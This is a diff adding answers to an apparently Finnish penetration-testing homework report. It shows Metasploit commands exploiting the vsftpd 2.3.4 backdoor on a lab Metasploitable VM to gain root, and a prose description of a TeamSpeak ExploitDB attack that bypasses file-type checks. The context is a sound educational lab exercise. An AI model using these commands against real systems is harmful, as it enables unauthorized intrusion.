@@ -72,12 +72,42 @@ Irroita koneet Internetistä harjoittelun ajaksi. Ole huolellinen.
 
 #### f) Murtaudu Metasploitablen VsFtpd-palveluun Metasploitilla (search vsftpd, use 0, set RHOSTS - varmista osoite huolella, exploit, id)
 
+- Aloitetaan tekemälllä versioskannaus (-sV) nmapilla tuolle ftp portille 21, josta löydetään vsftpd pavelelu ja sen versio 2.3.4.
+  
+  ![sV](https://i.imgur.com/i9d6cI3.png)
+
+- Tämän jälkeen etsitään MSF:n tietokannasta vsftpd:n haavoittuvuuksia, ja kappas sieltähän löytyy juurikin meidän versiollemme 'Backdoor Command Execution' exploitti.
+
+![searchh](https://i.imgur.com/JrmxKsr.png)
+
+- Seuraavaksi otetaan tuo löydetty exploitti käyttöön, asetetaan kohdekohdeen ip rhostiksi, ja oma ip chostiksi. Tässä ei nyt lisätty mitään payloadia, eli mitään kohteessa ajettavaa koodia (esim. etäkäyttötyökalua), vaan käytetään default terminaalia, ja kun ollaan asetukset on kohdillaan voidaan painaa exploit.
+
+```
+msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
+[*] No payload configured, defaulting to cmd/unix/interact
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set rhosts 192.168.56.103
+rhosts => 192.168.56.103
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set chost 192.168.56.101
+chost => 192.168.56.101
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
+
+ ```
+- Ei niin yllättäen hyökkäys oli onnistunut, ja olemme roottina kohteessa sisällä.
+
+  ![asdas](https://i.imgur.com/eewpmch.png)
+  
 
 #### g) Parempi sessio. Tee vsftpd-hyökkäyksestä saadusta sessiosta parempi. (Voit esimerkiksi päivittää sen meterpreter-sessioksi, laittaa tty:n toimimaan tai tehdä uuden käyttäjän ja ottaa yhteyden jollain tavallisella protokollalla)
+
+- ?
 
 
 #### h) Etsi, tutki ja kuvaile jokin hyökkäys ExploitDB:sta. (Tässä harjoitustehtävässä pitää hakea ja kuvailla hyökkäys, itse hyökkääminen jää vapaaehtoiseksi lisätehtäväksi)
 
+- Huvikseni syöttelin tuonne hakukenttään ohjelmia, joita olen itse käyttänyt, ja TeamSpeak hakusanalla löytyi suht mielenkiintoinen hyökkäys (https://www.exploit-db.com/exploits/38513). Eli pahimnillaan kyseisellä hyökkäyksellä päästään ajamaan koodia kohdekoneella.
+- Hyökkäyksen toimintaperiaate on itseasiassa melko yksinkertainen, ja se perustuu TeamSpeak-kanavan kuvauksen vaihtamiseen, jossa img-tagien väliin voidaan syöttää käytännössä minkälaisia tiedostoja tahansa, sillä TeamSpeak ei tarkasta tiedostotyyppejä, eikä tiedostoja uudelleen nimetä, mikä mahdolllistaa haitallisen ohjelmatiedoston muodostamisen.
+- Lisäksi voidaan liikkua ja tallentaa tiedostojärjestelmän sisällä samoilla oikeuksilla mitä TeamSpeakilla on, mikä ei ainakaan Windowsilla välttämättä ole kovinkaan hyvä juttu.
+- TeamSpeak siis oletuksena koittaa tarkastaa, että kyseessä on oikea kuvatiedosto tarkastamalla tiedoston 'headeristä' 'content typen' annetusta urlista, mutta tämä on mahdollista ohittaa hostaamalla kuva omalla web-palvelimella, jossa on suht simppeli php-skripti, jolla tämä ohitetaan.
 
 #### i) Etsi, tutki ja kuvaile hyökkäys 'searchsploit' -komennolla. Muista päivittää. (Tässä harjoitustehtävässä pitää hakea ja kuvailla hyökkäys, itse hyökkääminen jää vapaaehtoiseksi lisätehtäväksi. Valitse eri hyökkäys kuin edellisessä kohdassa.)
 
